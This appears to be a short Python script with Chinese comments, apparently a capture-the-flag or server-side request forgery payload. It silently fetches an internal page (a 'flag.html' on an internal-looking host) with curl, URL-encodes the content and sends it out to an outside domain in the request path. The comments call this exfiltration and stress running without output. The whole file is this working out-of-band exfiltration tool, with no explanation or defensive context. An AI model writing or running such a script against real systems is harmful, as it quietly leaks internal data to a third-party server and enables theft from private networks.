import subprocess
import urllib.parse

target_url = "http://tst.woa.com/flag.html"  # ← 你可以改成任意目标 URL

# 静默执行 curl，获取原始字节输出，不打印任何东西
result = subprocess.run(["curl", "-s", "--max-time", "10", target_url], capture_output=True)

# 判断是否成功获取非空内容
if result.returncode != 0 or not result.stdout:
    # 无法访问或内容为空 → 使用 "data=null"
    exfil_content = "data=null"
else:
    try:
        # 尝试用 UTF-8 解码，失败则用 latin-1 避免崩溃
        content = result.stdout.decode('utf-8')
    except UnicodeDecodeError:
        content = result.stdout.decode('latin-1', errors='replace')

    # 如果解码后是空字符串，也视为无内容
    if not content.strip():
        exfil_content = "data=null"
    else:
        exfil_content = content

# 对外带内容做 URL 编码（确保安全拼接到 URL 路径）
encoded = urllib.parse.quote(exfil_content, safe='')  # safe='' 表示连 / 也编码

# 发起外带请求（静默，不输出）
subprocess.run(["curl", "-s", "--max-time", "10", f"https://dongshan.cloud/{encoded}"], capture_output=True)